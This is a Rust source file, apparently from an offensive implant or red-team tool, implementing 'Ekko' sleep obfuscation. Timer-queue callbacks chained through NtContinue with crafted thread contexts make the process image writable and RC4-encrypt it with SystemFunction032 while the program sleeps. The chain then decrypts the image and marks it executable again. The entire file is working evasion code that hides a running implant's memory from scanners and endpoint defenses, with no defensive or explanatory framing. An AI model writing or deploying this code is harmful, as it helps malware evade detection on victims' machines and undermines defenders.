use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
use std::ffi::c_void;
use tracing::{debug, warn};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{CONTEXT, RtlCaptureContext};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
use windows::Win32::System::Threading::{
    CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue,
    WT_EXECUTEINTIMERTHREAD, WaitForSingleObject,
};
use windows::core::{PCSTR, PCWSTR};

#[repr(C)]
struct Ustring {
    length: u32,
    maximum_length: u32,
    buffer: *mut c_void,
}

pub fn stealth_sleep(millis: u32) {
    if millis == 0 {
        return;
    }

    // Attempt advanced "Ekko" sleep obfuscation
    // If it fails (missing symbols, API errors), fall back to standard sleep
    unsafe {
        if let Err(e) = try_ekko_sleep(millis) {
            debug!("Ekko sleep unavailable ({}), utilizing standard sleep", e);
            std::thread::sleep(std::time::Duration::from_millis(millis as u64));
        }
    }
}

unsafe fn try_ekko_sleep(millis: u32) -> Result<(), String> {

    // Helper to get module handle safely

    let get_module = |name: &str| -> Result<windows::Win32::Foundation::HMODULE, String> {

        let wide: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();

        // SAFETY: We provide a valid null-terminated wide string.

        unsafe {

            GetModuleHandleW(PCWSTR(wide.as_ptr()))

                .map_err(|e| format!("failed to get handle for {}: {}", name, e))

        }

    };



    let h_ntdll = get_module("ntdll.dll")?;

    let h_advapi32 = get_module("advapi32.dll")?;

    let h_kernel32 = get_module("kernel32.dll")?;



    let (p_nt_continue, p_system_function_032, p_virtual_protect, p_set_event) = unsafe {

        let p_nt = GetProcAddress(h_ntdll, PCSTR("NtContinue\0".as_ptr()))

            .ok_or("NtContinue not found")?;

        let p_sys = GetProcAddress(h_advapi32, PCSTR("SystemFunction032\0".as_ptr()))

            .ok_or("SystemFunction032 not found")?;

        let p_vp = GetProcAddress(h_kernel32, PCSTR("VirtualProtect\0".as_ptr()))

            .ok_or("VirtualProtect not found")?;

        let p_se = GetProcAddress(h_kernel32, PCSTR("SetEvent\0".as_ptr()))

            .ok_or("SetEvent not found")?;

        (p_nt, p_sys, p_vp, p_se)

    };



    // Get current image base and size

    // SAFETY: GetModuleHandleW(None) is safe. Pointer arithmetic is unsafe but necessary.

    let (base, image_size) = unsafe {

        let base_mod = GetModuleHandleW(None).map_err(|e| format!("failed to get base address: {}", e))?;

        let base_ptr = base_mod.0 as *mut c_void;

        

        let dos_header = &*(base_ptr as *const IMAGE_DOS_HEADER);

        if dos_header.e_magic != 0x5A4D { // MZ

            return Err("invalid DOS header magic".to_string());

        }

        

        let nt_headers_ptr = base_ptr.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        let nt_headers = &*nt_headers_ptr;

        if nt_headers.signature != 0x00004550 { // PE\0\0

            return Err("invalid NT header signature".to_string());

        }

        

        (base_ptr, nt_headers.optional_header.size_of_image as usize)

    };



    // Prepare encryption key (fixed key for obfuscation only)

    let mut key_data = [0u8; 16];

    for i in 0..16 {

        key_data[i] = (i * 0x33) as u8;

    }

    let mut key = Ustring {

        length: 16,

        maximum_length: 16,

        buffer: key_data.as_mut_ptr() as *mut c_void,

    };

    let mut data = Ustring {

        length: image_size as u32,

        maximum_length: image_size as u32,

        buffer: base,

    };



    // Create synchronization primitives

    // SAFETY: FFI calls.

    let (event, timer_queue) = unsafe {

        let evt = CreateEventW(None, true, false, None)

            .map_err(|e| format!("CreateEventW failed: {}", e))?;

        

        let tq = match CreateTimerQueue() {

            Ok(q) => q,

            Err(e) => {

                let _ = CloseHandle(evt);

                return Err(format!("CreateTimerQueue failed: {}", e));

            }

        };

        (evt, tq)

    };



    let mut old_protect = PAGE_PROTECTION_FLAGS::default();



    // Capture context for ROP chain

    let mut ctx_template = CONTEXT::default();

    unsafe { RtlCaptureContext(&mut ctx_template) };



    // 1. Change memory permissions to RW (VirtualProtect)

    let mut ctx_prot_rw = ctx_template.clone();

    ctx_prot_rw.Rip = p_virtual_protect as u64;

    ctx_prot_rw.Rcx = base as u64;

    ctx_prot_rw.Rdx = image_size as u64;

    ctx_prot_rw.R8 = PAGE_READWRITE.0 as u64;

    ctx_prot_rw.R9 = &mut old_protect as *mut _ as u64;



    // 2. Encrypt memory (SystemFunction032)

    let mut ctx_mask = ctx_template.clone();

    ctx_mask.Rip = p_system_function_032 as u64;

    ctx_mask.Rcx = &mut data as *mut _ as u64;

    ctx_mask.Rdx = &mut key as *mut _ as u64;



    // 3. Decrypt memory (SystemFunction032)

    let mut ctx_unmask = ctx_template.clone();

    ctx_unmask.Rip = p_system_function_032 as u64;

    ctx_unmask.Rcx = &mut data as *mut _ as u64;

    ctx_unmask.Rdx = &mut key as *mut _ as u64;



    // 4. Restore memory permissions to RX/RWX (VirtualProtect)

    let mut ctx_prot_rx = ctx_template.clone();

    ctx_prot_rx.Rip = p_virtual_protect as u64;

    ctx_prot_rx.Rcx = base as u64;

    ctx_prot_rx.Rdx = image_size as u64;

    ctx_prot_rx.R8 = 0x40; // PAGE_EXECUTE_READWRITE

    ctx_prot_rx.R9 = &mut old_protect as *mut _ as u64;



    // 5. Signal event to wake up main thread (SetEvent)

    let mut ctx_set_event = ctx_template.clone();

    ctx_set_event.Rip = p_set_event as u64;

    ctx_set_event.Rcx = event.0 as u64;



    debug!("queueing Ekko sleep mask chain ({}ms)", millis);



    let mut h_timer = HANDLE(0);

    // Removed unused `timers` vec, as we just reuse h_timer for the calls, 

    // although strictly speaking we might want to keep track of them if we wanted to delete them explicitly,

    // but DeleteTimerQueue cleans them up.



    // Schedule timers

    // SAFETY: FFI calls and transmute.

    let result = unsafe {

        (|| -> Result<(), windows::core::Error> {

            CreateTimerQueueTimer(

                &mut h_timer,

                timer_queue,

                Some(std::mem::transmute(p_nt_continue)),

                Some(&ctx_prot_rw as *const _ as *const c_void),

                10,

                0,

                WT_EXECUTEINTIMERTHREAD,

            )?;



            CreateTimerQueueTimer(

                &mut h_timer,

                timer_queue,

                Some(std::mem::transmute(p_nt_continue)),

                Some(&ctx_mask as *const _ as *const c_void),

                20,

                0,

                WT_EXECUTEINTIMERTHREAD,

            )?;



            CreateTimerQueueTimer(

                &mut h_timer,

                timer_queue,

                Some(std::mem::transmute(p_nt_continue)),

                Some(&ctx_unmask as *const _ as *const c_void),

                millis + 30,

                0,

                WT_EXECUTEINTIMERTHREAD,

            )?;



            CreateTimerQueueTimer(

                &mut h_timer,

                timer_queue,

                Some(std::mem::transmute(p_nt_continue)),

                Some(&ctx_prot_rx as *const _ as *const c_void),

                millis + 40,

                0,

                WT_EXECUTEINTIMERTHREAD,

            )?;



            CreateTimerQueueTimer(

                &mut h_timer,

                timer_queue,

                Some(std::mem::transmute(p_nt_continue)),

                Some(&ctx_set_event as *const _ as *const c_void),

                millis + 50,

                0,

                WT_EXECUTEINTIMERTHREAD,

            )?;

            

            Ok(())

        })()

    };



    if let Err(e) = result {

        // Cleanup if timer creation failed

        warn!("failed to create timer queue timers: {}", e);

        unsafe {

            let _ = DeleteTimerQueue(timer_queue);

            let _ = CloseHandle(event);

        }

        return Err(format!("timer creation failed: {}", e));

    }



    // Wait for the sequence to complete

    unsafe { WaitForSingleObject(event, 0xFFFFFFFF) };



    // Cleanup

    unsafe {

        let _ = DeleteTimerQueue(timer_queue);

        let _ = CloseHandle(event);

    }



    debug!("Ekko sleep masking cycle complete");

    Ok(())

}
